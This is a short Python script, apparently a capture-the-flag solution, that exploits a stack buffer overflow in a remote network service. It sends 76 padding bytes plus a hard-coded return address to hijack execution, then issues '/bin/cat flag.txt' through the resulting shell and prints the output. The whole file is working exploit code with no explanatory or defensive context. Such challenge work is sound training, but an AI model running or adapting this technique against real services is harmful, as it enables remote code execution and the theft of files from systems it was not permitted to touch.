#!/usr/bin/env python3

import sys
import socket
import string

if len(sys.argv) > 2:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    data = s.recv(8192).decode("utf-8")
    if data.startswith("How much"):
        sploit = "A"*76
        addr = b"\xcc\x89\x04\x08"
        s.send(sploit.encode()+addr+"\n".encode())
        data = s.recv(8192).decode("utf-8")
        s.send("/bin/cat flag.txt\n".encode())
        data = s.recv(8192).decode("utf-8")
        s.close()
        print(data.rstrip())
